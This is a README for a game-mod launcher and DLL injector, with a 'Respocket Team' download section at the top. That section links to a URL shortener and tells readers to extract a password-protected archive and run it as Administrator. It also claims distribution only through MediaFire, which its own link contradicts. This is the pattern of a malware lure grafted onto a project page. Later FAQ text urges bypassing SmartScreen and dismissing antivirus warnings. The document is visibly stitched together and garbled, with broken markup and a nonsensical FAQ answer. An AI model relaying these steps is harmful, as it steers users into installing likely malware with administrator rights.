<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<!-- markdownlint-disable MD033 MD041 -->

<details>
  <summary><strong>Table of Contents</strong></summary>
  <ul>
# About

<div align="center">
## Features

### Mod Management

- Downloads YimMenu and YimMenuV2 with the press of a button.
- Automatically checks for new releases of downloaded menus on init as well as on request.
- Optional lightweight process monitor (required for auto-inject).
- Automatically injects the menu precisely at the landing page. No manual configurations required.

### Standalone DLL Injector

- Add custom DLL files and inject them into any process.
- Offers standard WinAPI `LoadLibrary` as well as manual mapping.
- Successfully injected files will remember their last target process and automatically select it if it's running.
- The DLL list can be interacted with in a similar way to any other regular window, not necessarily ImGui list behavior:
  - Hold and drag items to reorder the list.
  - Left click an item to highlight it.
  - Right click an item to bring up its context menu.
  - Left click an empty space to reset your currently selected item.
  - Right click an empty space to bring up the list's context menu.

### Built-in Lua Scripting

- Provides an optional LuaJIT scripting environment, unrelated to any game or mod.
- Feature can be toggled on/off at any time.
- All scripts placed in the `/Plugins` folder (`%AppData%\YLP\Plugins`) are automatically loaded on program start if the scripting feature is toggled on. Plugins must be placed in their own subfolders and have a main entry file named exactly `main.lua` *(case-sensitive)*.
- Lua code can also be directly typed and executed in the `Lua Scripting` UI tab.
## FAQ

### Troubleshooting

- **Q:** I can't find `YLP.exe` in the injector tab's process list.
- **A:** Yes.

- **Q:** Manual Map injection crashed my game.
- **A:** This depends on the DLL file and the mapper's config. Some will break if you erase their PE headers, others must have structured exception handling setup, while others expect their delayed imports to be resolved which we currently don't do.

- **Q:** Auto-Inject shows a warning that says it was skipped.
- **A:** This can happen due to one of these reasons:
  1. BattlEye was detected: Simply disable it.
  2. The DLL file had an issue (deleted by AV, wrong signature, wrong architecture, etc.).
  3. Game version mismatch *(Legacy only)*: Auto-Inject will also be skipped if the latest DLL is outdated.
  4. The game loaded past the landing page: In this case, simply make sure the landing page is not disabled in your game settings.

### Security

- **Q:** Windows SmartScreen blocked YLP and said it *"protected my PC"*.
- **A:** This can happen when Windows doesn't have enough reputation information for an application, particularly when it is distributed independently and isn't digitally signed. It does **not** necessarily mean that the program contains malware. The only way for a developer to get around this is to purchase a code signing certificate. I can not afford it, and even if I could, there's no reason for me to buy it because this is just a hobby.

  If you downloaded an official release from this repository and trust it, you can select *"More info"* -> *"Run anyway"* in the SmartScreen dialog. If you're unsure where the file came from, **delete it instead**.

- **Q:** Why did my antivirus flag YLP?
- **A:** Some antivirus programs may flag YLP because it interacts directly with other applications, reads/writes their memory, and loads files into them. These are legitimate features required for YLP's modding and automation functionality, but they are also techniques that malware can abuse, so security software may treat them as suspicious.

  YLP is open source. Its releases can be independently inspected and built from the source code.

## Preview

<div>


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
